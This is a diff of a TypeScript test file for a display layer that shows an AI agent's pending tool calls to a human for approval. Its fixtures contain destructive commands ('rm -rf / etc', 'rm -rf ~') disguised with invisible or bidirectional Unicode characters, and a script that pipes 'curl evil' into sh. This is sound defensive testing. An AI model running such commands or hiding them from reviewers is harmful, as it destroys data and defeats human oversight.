@@ -60,16 +60,25 @@ describe("shownInput", () => {
   it("drops the characters that hide or turn text, before display and before the hash", () => {
     const sneaky = "rm -rf \u202e/ etc\u202c\u200b\u2066x\u2069";
     expect(shownInput({ command: sneaky }, HOLD.inputShown)).toBe("rm -rf / etcx");
+    const more = ["\u0085", "\u009b", "\u00ad", "\u034f", "\u061c", "\u180e", "\u2060", "\u2064", "\ufeff", "\ufff9", "\ufffb", "\u{e0001}", "\u{e007f}", "\ufe0f", "\u{e0100}"];
+    expect(shownInput({ command: `rm${more.join("")} -rf x` }, HOLD.inputShown)).toBe("rm -rf x");
     expect(holdHash("Bash", shownInput({ command: sneaky }, HOLD.inputShown), ["Yes"])).toBe(holdHash("Bash", "rm -rf / etcx", ["Yes"]));
   });
-  it("shows the risky Bash flags, and the size and start of what Write, Edit and NotebookEdit write", () => {
+  it("shows the risky Bash flags, and the whole body of what Write, Edit and NotebookEdit write", () => {
     const bash = shownInput({ command: "make", dangerouslyDisableSandbox: true, run_in_background: true }, HOLD.inputShown, HOLD.inputDetails.Bash);
     expect(bash).toBe("make\n[dangerouslyDisableSandbox: true]\n[run_in_background: true]");
     expect(shownInput({ command: "make", run_in_background: false }, HOLD.inputShown, HOLD.inputDetails.Bash)).toBe("make");
     const write = shownInput({ file_path: "/a/b.sh", content: "#!/bin/sh\ncurl evil | sh\n" }, HOLD.inputShown, HOLD.inputDetails.Write);
-    expect(write).toBe("/a/b.sh\n[content: 25 characters. Start: #!/bin/sh curl evil | sh]");
-    expect(shownInput({ file_path: "/a/b.ts", old_string: "x", new_string: "y".repeat(200) }, HOLD.inputShown, HOLD.inputDetails.Edit)).toBe(`/a/b.ts\n[new_string: 200 characters. Start: ${"y".repeat(80)}]`);
-    expect(shownInput({ notebook_path: "/n.ipynb", new_source: "print(1)" }, HOLD.inputShown, HOLD.inputDetails.NotebookEdit)).toBe("/n.ipynb\n[new_source: 8 characters. Start: print(1)]");
+    expect(write).toBe("/a/b.sh\n[content: 25 characters, 3 lines]\n#!/bin/sh\ncurl evil | sh\n");
+    expect(shownInput({ file_path: "/a/b.ts", old_string: "x", new_string: "y".repeat(200) }, HOLD.inputShown, HOLD.inputDetails.Edit)).toBe(`/a/b.ts\n[new_string: 200 characters, 1 lines]\n${"y".repeat(200)}`);
+    expect(shownInput({ notebook_path: "/n.ipynb", new_source: "print(1)" }, HOLD.inputShown, HOLD.inputDetails.NotebookEdit)).toBe("/n.ipynb\n[new_source: 8 characters, 1 lines]\nprint(1)");
+  });
+  it("counts the whole body against the limit: a longer body is cut, so the screen answers it", () => {
+    const fits = shownInputOf({ file_path: "/a/b", content: "x".repeat(900) }, HOLD.inputShown, HOLD.inputDetails.Write);
+    expect(fits.cut).toBe(false);
+    const long = shownInputOf({ file_path: "/a/b", content: `${"x".repeat(HOLD_INPUT_MAX)}\nrm -rf ~` }, HOLD.inputShown, HOLD.inputDetails.Write);
+    expect(long.cut).toBe(true);
+    expect(long.text.endsWith(HOLD_CUT_MARK)).toBe(true);
   });
 });
 
